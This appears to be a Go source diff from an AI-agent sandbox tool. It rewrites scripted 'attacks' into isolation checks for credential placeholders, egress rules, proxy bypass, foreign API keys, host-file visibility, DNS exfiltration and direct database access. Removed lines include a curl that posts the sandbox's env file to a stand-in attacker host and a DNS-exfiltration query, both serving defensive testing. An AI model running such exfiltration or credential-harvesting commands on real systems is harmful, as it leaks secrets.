@@ -3,10 +3,12 @@ package service
 import (
 	"bytes"
 	"context"
+	"encoding/json"
 	"errors"
 	"fmt"
 	"net"
 	"os"
+	"path/filepath"
 	"strings"
 	"sync"
 	"time"
@@ -15,38 +17,45 @@ import (
 	"github.com/shaoxier/AIofCage/internal/sandbox"
 )
 
-// Attack is a scripted attempt, modeled on a real incident, that runs inside the sandbox as the
-// agent user. Each script prints its own observations; the host decides whether it was stopped.
+// 保留旧 API 类型以兼容命令行调用，界面统一称为隔离检查。
 type Attack struct {
 	ID       string `json:"id"`
 	Title    string `json:"title"`
-	Incident string `json:"incident"`
+	Incident string `json:"incident,omitempty"`
 	Layer    string `json:"layer"`
 }
-
 type AttackResult struct {
 	Attack
+	Status   string `json:"status"`
 	Blocked  bool   `json:"blocked"`
 	Skipped  bool   `json:"skipped"`
 	Evidence string `json:"evidence"`
 	Note     string `json:"note"`
 }
 
+const (
+	checkPassed       = "passed"
+	checkProblem      = "problem"
+	checkInconclusive = "inconclusive"
+	checkSkipped      = "skipped"
+)
+
 var attacks = []Attack{
-	{"steal-env", "读取环境变量和配置里的 API Key", "LiteLLM 1.107.0 投毒（2026-10）、tensorlake 投毒：窃取环境变量与配置文件中的 AI key", "密钥占位符"},
-	{"exfil-domain", "把密钥文件发到攻击者的服务器", "LiteLLM 投毒把窃取的数据发往仿冒域名", "出网白名单"},
-	{"bypass-proxy", "绕开代理直接连外网", "代理只靠环境变量时，恶意代码可以 unset 代理变量直连（Infisical 的提醒）", "无出网路由"},
-	{"foreign-key", "用攻击者自己的 key 借白名单域名外传", "借 Anthropic Files API 外传数据：域名在白名单里，key 是攻击者的", "只认占位符"},
-	{"host-files", "读取或删除宿主机上的文件", "Claude Code 执行 rm -rf … ~/ 删掉整个家目录（2025-12）", "文件隔离"},
-	{"dns-exfil", "通过 DNS 查询把数据带出去", "Claude Code DNS 外传漏洞（CVE-2025-55284）", "无外部 DNS"},
-	{"db-direct", "找数据库密码并绕过门卫直连数据库", "tensorlake 投毒把 MCP 配置列为窃取目标：配置里的数据库连接串和密码会被偷走", "密码在沙箱外"},
+	{ID: "steal-env", Title: "凭据配置", Layer: "密钥占位符"},
+	{ID: "exfil-domain", Title: "未授权域名请求", Layer: "出网规则"},
+	{ID: "bypass-proxy", Title: "绕开代理直连公网", Layer: "网络路由"},
+	{ID: "foreign-key", Title: "外来凭据请求", Layer: "凭据校验"},
+	{ID: "host-files", Title: "宿主测试文件与 Docker 接口", Layer: "文件隔离"},
+	{ID: "dns-exfil", Title: "公网 DNS 连通性", Layer: "DNS 与路由"},
+	{ID: "db-direct", Title: "直连数据库与密码配置", Layer: "可信连接器"},
 }
 
-func (a *App) ListAttacks() []Attack { return append([]Attack(nil), attacks...) }
+func (a *App) ListIsolationChecks() []Attack                     { return append([]Attack(nil), attacks...) }
+func (a *App) ListAttacks() []Attack                             { return a.ListIsolationChecks() }
+func (a *App) SimulateAttacks(id string) ([]AttackResult, error) { return a.RunIsolationChecks(id) }
 
-// SimulateAttacks runs every attack in a running sandbox. Blocked requests also show up in the
-// request log, because they go through the same gatekeeper as the agent.
-func (a *App) SimulateAttacks(id string) ([]AttackResult, error) {
+// 每项只使用测试数据；没有充分证据或执行失败时不判通过。
+func (a *App) RunIsolationChecks(id string) ([]AttackResult, error) {
 	if err := a.runtimeReady(); err != nil {
 		return nil, err
 	}
@@ -56,165 +65,196 @@ func (a *App) SimulateAttacks(id string) ([]AttackResult, error) {
 	}
 	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
 	defer cancel()
-	if a.manager.Status(ctx, sbx.ID).State != "running" {
+	if a.manager.Status(ctx, id).State != "running" {
 		return nil, errors.New("请先启动沙箱")
 	}
-	secrets, err := a.realSecrets(ctx, sbx)
-	if err != nil {
-		return nil, err
-	}
+	secrets, _ := a.realSecrets(ctx, sbx)
 	started := a.now()
-	defer func() { a.demos.add(sbx.ID, demoRun{Start: started, End: a.now()}) }()
+	defer func() { a.demos.add(id, demoRun{Start: started, End: a.now()}) }()
 	results := make([]AttackResult, 0, len(attacks))
-	for _, attack := range attacks {
-		result := a.runAttack(ctx, sbx, attack)
-		// Whatever the attack printed must never contain a real secret.
+	for _, check := range attacks {
+		r := a.runAttack(ctx, sbx, check)
 		for _, secret := range secrets {
-			if strings.Contains(result.Evidence, secret) {
-				result.Blocked, result.Evidence = false, "输出里出现了真实密钥（已隐去）"
+			if strings.Contains(r.Evidence, secret) || strings.Contains(r.Note, secret) {
+				r.Status = checkProblem
+				r.Evidence = "检查输出包含真实凭据（已隐去）"
+				r.Note = "请停止该沙箱并检查凭据隔离。"
 			}
 		}
-		results = append(results, result)
+		// 兼容字段只由明确结论推导，不把证据不足算作阻止成功。
+		r.Blocked = r.Status == checkPassed
+		r.Skipped = r.Status == checkSkipped
+		if len([]rune(r.Evidence)) > 1400 {
+			r.Evidence = string([]rune(r.Evidence)[:1400]) + "…"
+		}
+		results = append(results, r)
 	}
 	return results, nil
 }
 
-// realSecrets reads the sandbox's real keys so the host can confirm none of them leaked. They
-// never leave this process.
+// 仅在宿主比较/脱敏，秘密不传入检查脚本。
 func (a *App) realSecrets(ctx context.Context, sbx sandbox.Sandbox) ([]string, error) {
 	var refs []string
-	for _, binding := range sbx.Bindings {
-		if binding.ProviderID == "" {
-			continue
-		}
-		if p, err := a.store.Provider(binding.ProviderID); err == nil {
+	for _, b := range append(append([]sandbox.Binding{}, sbx.Bindings...), sbx.AppliedBindings...) {
+		if p, err := a.store.Provider(b.ProviderID); err == nil {
 			refs = append(refs, p.KeyRef)
 		}
+	}
+	for _, p := range sbx.AppliedProviders {
+		refs = append(refs, p.KeyRef)
 	}
 	for _, id := range sbx.MCP {
 		refs = append(refs, mcp.KeyRefFor(id))
 	}
-	var secrets []string
+	var values []string
 	for _, ref := range refs {
-		if value, err := a.vault.Read(ctx, ref); err == nil && len(value) >= 8 {
-			secrets = append(secrets, string(value))
+		if v, err := a.vault.Read(ctx, ref); err == nil && len(v) >= 8 {
+			values = append(values, string(v))
 		}
 	}
-	return secrets, nil
+	return values, nil
 }
 
-func (a *App) exec(ctx context.Context, sbx sandbox.Sandbox, script string) string {
-	var out bytes.Buffer
-	_ = a.manager.Exec(ctx, sbx.ID, false, nil, &out, &out, "bash", "-c", script)
-	return strings.TrimSpace(out.String())
+// 脚本输出严格 JSON；命令错误优先于脚本声称的结论。
+func classifyCheck(check Attack, out []byte, execErr error) AttackResult {
+	r := AttackResult{Attack: check, Status: checkInconclusive}
+	if execErr != nil {
+		r.Evidence = "检查命令执行失败：" + execErr.Error()
+		r.Note = "执行失败不能证明隔离有效，请检查运行状态后重试。"
+		return r
+	}
+	var value struct {
+		Status   string `json:"status"`
+		Evidence string `json:"evidence"`
+		Note     string `json:"note"`
+	}
+	if json.Unmarshal(bytes.TrimSpace(out), &value) != nil || value.Evidence == "" {
+		r.Evidence = "未取得完整检查结果"
+		r.Note = "没有足够证据判断。"
+		return r
+	}
+	switch value.Status {
+	case checkPassed, checkProblem, checkInconclusive:
+		r.Status = value.Status
+	}
+	r.Evidence = value.Evidence
+	r.Note = value.Note
+	return r
 }
 
-func (a *App) runAttack(ctx context.Context, sbx sandbox.Sandbox, attack Attack) AttackResult {
-	result := AttackResult{Attack: attack}
-	switch attack.ID {
-	case "steal-env":
-		// Print credential-looking variables with their values cut to a short prefix.
-		out := a.exec(ctx, sbx, `env | grep -iE '(key|token|secret)[^=]*=' | sed -E 's/=(.{0,9}).*/=\1…/' | sort`)
-		full := a.exec(ctx, sbx, `env | grep -iE '(key|token|secret)[^=]*=' | cut -d= -f2-`)
-		result.Evidence = orNone(out)
-		result.Blocked = true
-		for _, value := range strings.Split(full, "\n") {
-			if value = strings.TrimSpace(value); value != "" && !strings.HasPrefix(value, "cage-") {
-				result.Blocked = false
-			}
-		}
-		result.Note = "拿到的都是 cage- 开头的占位符，真实密钥只在门卫内存里。"
-	case "exfil-domain":
-		out := a.exec(ctx, sbx, `curl -sS -m 15 -o /dev/null -w 'HTTP %{http_code}' -X POST --data-binary @"$HOME/.aiofcage/env" https://upload.attacker-collector.example/steal 2>&1 | tail -2`)
-		result.Evidence = out
-		result.Blocked = !strings.Contains(out, "HTTP 2")
-		result.Note = "门卫在建立连接前就拒绝了未授权域名，数据没有离开沙箱。"
-	case "bypass-proxy":
-		out := a.exec(ctx, sbx, `unset HTTPS_PROXY https_proxy HTTP_PROXY http_proxy ALL_PROXY all_proxy
-curl -sS -m 5 -o /dev/null -w 'curl: HTTP %{http_code}\n' https://223.5.5.5/ 2>&1 | tail -1
-python3 - <<'EOF'
-import socket
-for host in ("223.5.5.5", "1.1.1.1"):
-    s = socket.socket(); s.settimeout(3)
+const checkPython = `import os,sys,json,socket,errno,re,subprocess,pathlib
+
+def result(status,evidence,note):
+    print(json.dumps(dict(status=status,evidence=evidence,note=note),ensure_ascii=False))
+
+blocked_errors=(errno.ENETUNREACH,errno.EHOSTUNREACH,errno.EACCES,errno.EPERM)
+
+def connect(host,port):
+    s=socket.socket();s.settimeout(3)
     try:
-        s.connect((host, 443)); print("socket", host, "CONNECTED")
+        s.connect((host,port));return "connected"
     except OSError as e:
-        print("socket", host, "失败：", e.__class__.__name__)
+        return "blocked" if e.errno in blocked_errors else type(e).__name__
     finally:
         s.close()
-EOF`)
-		result.Evidence = out
-		result.Blocked = !strings.Contains(out, "CONNECTED") && !strings.Contains(out, "HTTP 2") && !strings.Contains(out, "HTTP 3")
-		result.Note = "沙箱所在的内部网络没有默认路由，绕开代理也无路可走（这类尝试不会经过门卫，所以日志里没有记录）。"
+
+def curl_check(url,headers,expected):
+    args=["curl","--silent","--show-error","--max-time","12","--dump-header","-","--output","/dev/null","--request","POST","--data","aiofcage-isolation-probe"]
+    for h in headers: args.extend(["--header",h])
+    p=subprocess.run(args+[url],capture_output=True,text=True,timeout=15)
+    codes=re.findall(r"(?im)^HTTP/[^ ]+ ([0-9]{3})(?![^\r\n]*Connection established)",p.stdout)
+    reasons=re.findall(r"(?im)^x-aiofcage-reason: *([^\r\n]+)",p.stdout)
+    status="passed" if "403" in codes and expected in reasons else "problem" if codes and 200<=int(codes[-1])<400 else "inconclusive"
+    result(status,"HTTP "+(" / ".join(codes) or "无响应")+"；代理原因："+(" / ".join(reasons) or "未取得")+"；curl 退出码 "+str(p.returncode),"仅验证本次请求和返回原因。网络错误、超时或其他拒绝原因不判通过。")
+`
+
+func (a *App) runAttack(ctx context.Context, sbx sandbox.Sandbox, check Attack) AttackResult {
+	var script string
+	switch check.ID {
+	case "steal-env":
+		script = `
+names=[];suspects=[]
+for k,v in os.environ.items():
+    if re.search(r"(api_?key|token|secret|password)$",k,re.I) and v:
+        names.append(k)
+        if not v.startswith("cage-"): suspects.append(k)
+files=[".aiofcage/env",".codex/config.toml",".claude.json",".dsh/cordis.patch.yml"]
+found=[]
+for f in files:
+    p=pathlib.Path.home()/f
+    if p.is_file():
+        text=p.read_text(errors="replace")
+        if re.search(r"(?:sk-[a-zA-Z0-9]{12,}|(?:postgres|postgresql)://[^\s\"]*:[^\s\"]*@)",text): found.append(f)
+result("problem" if suspects or found else "passed" if names else "inconclusive","已检查凭据变量："+(", ".join(names) or "无")+"；非占位变量名："+(", ".join(suspects) or "无")+"；疑似凭据配置文件："+(", ".join(found) or "无"),"检查已知配置位置与凭据变量，不扫描项目或历史记录，也不输出凭据值。")`
+	case "exfil-domain":
+		script = `curl_check("https://upload.attacker-collector.example/isolated-probe",[],"default_deny")`
 	case "foreign-key":
 		host, path := a.firstProviderEndpoint(sbx)
 		if host == "" {
-			result.Skipped, result.Note = true, "这个沙箱没有绑定供应商，跳过。"
-			return result
+			return AttackResult{Attack: check, Status: checkSkipped, Note: "没有生效的模型供应商。"}
 		}
-		// The proxy's own "200 Connection established" comes first; only the final answer matters.
-		script := fmt.Sprintf(`curl -sS -m 15 -o /dev/null -D - -X POST -H 'Authorization: Bearer sk-attacker-own-key-0000000000' -H 'Content-Type: application/json' -d '{"input":"偷来的项目数据"}' https://%s%s 2>&1 | grep -iE '^(HTTP/|x-aiofcage-reason)' | tr -d '\r' | tail -2`, host, path)
-		out := a.exec(ctx, sbx, script)
-		result.Evidence = orNone(out)
-		result.Blocked = strings.Contains(out, "403") && strings.Contains(strings.ToLower(out), "credential_foreign")
-		result.Note = "这个域名在白名单里，但门卫只接受本沙箱的占位符，带着别人的 key 的请求一律拒绝。"
+		url, _ := json.Marshal("https://" + host + path)
+		script = "curl_check(" + string(url) + `,["Authorization: Bearer aiofcage-test-foreign-credential","x-api-key: aiofcage-test-foreign-credential"],"credential_foreign")`
+	case "bypass-proxy":
+		script = `
+observations=[(host,connect(host,443)) for host in ("223.5.5.5","1.1.1.1")]
+status="problem" if any(v=="connected" for _,v in observations) else "passed" if all(v=="blocked" for _,v in observations) else "inconclusive"
+result(status,"；".join(host+":443 "+value for host,value in observations),"socket 直接测试两个 IPv4 地址，不发送应用数据；超时和连接拒绝不足以证明无出网能力。")`
 	case "host-files":
-		home, _ := os.UserHomeDir()
-		// Non-destructive on purpose: even if isolation were broken, the probe only tries to create
-		// a marker file, never to delete anything.
-		script := fmt.Sprintf(`echo "宿主家目录在沙箱里能看到：$(ls -A %[1]s 2>&1 | tr '\n' ' ')"
-for f in %[1]s/.ssh %[1]s/.aws %[1]s/Library /var/run/docker.sock; do test -e "$f" && echo "可见：$f"; done
-if touch %[1]s/aiofcage-attack-probe 2>/dev/null; then echo "可见：能在宿主家目录写文件"; else echo "在宿主家目录写文件：失败"; fi`, shellQuote(home))
-		out := a.exec(ctx, sbx, script)
-		result.Evidence = out
-		result.Blocked = !strings.Contains(out, "可见：")
-		result.Note = "沙箱只挂载了项目目录；宿主的 ~/.ssh、钥匙串和其他文件在沙箱里根本不存在。"
+		dir, err := os.MkdirTemp("", "aiofcage-isolation-")
+		if err != nil {
+			return classifyCheck(check, nil, err)
+		}
+		defer os.RemoveAll(dir)
+		marker := filepath.Join(dir, "host-probe.txt")
+		if err := os.WriteFile(marker, []byte("aiofcage own test fixture"), 0644); err != nil {
+			return classifyCheck(check, nil, err)
+		}
+		value, _ := json.Marshal(marker)
+		script = "marker=" + string(value) + `
+visible=os.path.exists(marker)
+sock=os.path.exists("/var/run/docker.sock")
+result("problem" if visible or sock else "passed","宿主自建测试文件可见："+str(visible)+"；Docker socket 可见："+str(sock),"宿主临时测试文件在检查后删除。此结果只覆盖该路径和 Docker socket，不代表已检查所有挂载或容器逃逸。")`
 	case "dns-exfil":
-		out := a.exec(ctx, sbx, `python3 - <<'EOF'
-import os, socket
-name = "leak-" + os.urandom(4).hex() + ".attacker-collector.example"
+		script = `
+resolvers=re.findall(r"(?m)^nameserver\s+(\S+)",pathlib.Path("/etc/resolv.conf").read_text())
+route=pathlib.Path("/proc/net/route").read_text().splitlines()[1:]
+default4=any(len(row.split())>1 and row.split()[1]=="00000000" for row in route)
+route6=pathlib.Path("/proc/net/ipv6_route")
+default6=any(row.split()[0]=="0"*32 and row.split()[1]=="00" and row.split()[-1]!="lo" for row in route6.read_text().splitlines()) if route6.exists() else False
+query=b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08aiofcage\x07invalid\x00\x00\x01\x00\x01"
+s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(3)
 try:
-    socket.getaddrinfo(name, 443); print("系统解析：成功")
+    s.sendto(query,("223.5.5.5",53));s.recvfrom(512);observed="received"
 except OSError as e:
-    print("系统解析：失败", e.__class__.__name__)
-query = os.urandom(2) + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00\x00\x01\x00\x01"
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(3)
-try:
-    s.sendto(query, ("223.5.5.5", 53)); s.recvfrom(512); print("直连 DNS：收到回复")
-except OSError as e:
-    print("直连 DNS：失败", e.__class__.__name__)
-EOF`)
-		result.Evidence = out
-		result.Blocked = !strings.Contains(out, "成功") && !strings.Contains(out, "收到回复")
-		result.Note = "沙箱没有外部 DNS，也没有到公网 DNS 服务器的路由，查询带不出去。"
+    observed="blocked" if e.errno in blocked_errors else type(e).__name__
+finally: s.close()
+local=bool(resolvers) and all(v in ("127.0.0.1","::1") for v in resolvers)
+status="problem" if observed=="received" else "passed" if observed=="blocked" and local and not default4 and not default6 else "inconclusive"
+result(status,"DNS 配置："+", ".join(resolvers)+"；IPv4/IPv6 默认路由："+str(default4)+"/"+str(default6)+"；公网 UDP 53："+observed,"只发送固定测试域名 aiofcage.invalid。超时不证明 DNS 隔离；未覆盖所有隧道或 IPv6 端点。")`
 	case "db-direct":
 		address := a.databaseAddress(sbx)
 		if address == "" {
-			result.Skipped, result.Note = true, "这个沙箱没有启用数据库 MCP，跳过。"
-			return result
+			return AttackResult{Attack: check, Status: checkSkipped, Note: "没有启用数据库 MCP。"}
 		}
-		host, port, _ := net.SplitHostPort(address)
-		script := fmt.Sprintf(`echo "Agent 配置里的数据库入口：$(grep -rhoE 'http://gatekeeper:[0-9]+/mcp/[a-z0-9-]+' ~/.claude.json ~/.codex 2>/dev/null | sort -u | tr '\n' ' ')"
-grep -rlE '(postgres|postgresql)://[^ "]*:[^ "]*@' ~/.claude.json ~/.codex ~/.aiofcage 2>/dev/null | sed 's/^/可见：带密码的连接串在 /'
-python3 - <<'EOF'
-import socket
-s = socket.socket(); s.settimeout(3)
-try:
-    s.connect((%q, %s)); print("直连数据库 %s：CONNECTED")
-except OSError as e:
-    print("直连数据库 %s：失败", e.__class__.__name__)
-finally:
-    s.close()
-EOF`, host, port, address, address)
-		out := a.exec(ctx, sbx, script)
-		result.Evidence = out
-		result.Blocked = !strings.Contains(out, "CONNECTED") && !strings.Contains(out, "可见：")
-		result.Note = "沙箱里只有门卫的 MCP 入口和占位符；数据库密码在沙箱外的可信连接器里，沙箱也没有通往数据库的网络。"
+		host, port, err := net.SplitHostPort(address)
+		if err != nil {
+			return classifyCheck(check, nil, err)
+		}
+		target, _ := json.Marshal(host)
+		script = fmt.Sprintf(`
+found=[]
+for f in (".claude.json",".codex/config.toml",".aiofcage/env"):
+    p=pathlib.Path.home()/f
+    if p.is_file() and re.search(r"(?:postgres|postgresql)://[^\s\"]*:[^\s\"]*@",p.read_text(errors="replace")): found.append(f)
+observed=connect(%s,int(%q))
+result("problem" if found or observed=="connected" else "passed" if observed=="blocked" else "inconclusive","疑似密码连接串文件："+(", ".join(found) or "无")+"；数据库直连："+observed,"只尝试建立 TCP 连接，不登录、不执行数据库操作；超时不能证明隔离。")`, string(target), port)
+	default:
+		return AttackResult{Attack: check, Status: checkSkipped, Note: "未支持的检查项。"}
 	}
-	if len(result.Evidence) > 600 {
-		result.Evidence = result.Evidence[:600] + "…"
-	}
-	return result
+	var out bytes.Buffer
+	err := a.manager.Exec(ctx, sbx.ID, false, nil, &out, &out, "python3", "-c", checkPython+"\n"+script)
+	return classifyCheck(check, out.Bytes(), err)
 }
 
 // databaseAddress returns where the sandbox's first database service is reached from the VM.
@@ -231,13 +271,21 @@ func (a *App) databaseAddress(sbx sandbox.Sandbox) string {
 
 // firstProviderEndpoint returns the host and model API path of the first bound provider.
 func (a *App) firstProviderEndpoint(sbx sandbox.Sandbox) (string, string) {
-	for _, binding := range sbx.Bindings {
+	bindings := sbx.Bindings
+	if sbx.AppliedProviders != nil {
+		bindings = sbx.AppliedBindings
+	}
+	for _, binding := range bindings {
 		if binding.ProviderID == "" {
 			continue
 		}
-		p, err := a.store.Provider(binding.ProviderID)
-		if err != nil {
-			continue
+		p, ok := sbx.AppliedProviders[binding.ProviderID]
+		if !ok {
+			var err error
+			p, err = a.store.Provider(binding.ProviderID)
+			if err != nil {
+				continue
+			}
 		}
 		rules := p.Rules()
 		host, _, err := p.Endpoint()
@@ -286,11 +334,4 @@ func (d *demoLog) contains(id string, t time.Time) bool {
 		}
 	}
 	return false
-}
-
-func orNone(value string) string {
-	if value == "" {
-		return "（没有输出）"
-	}
-	return value
 }
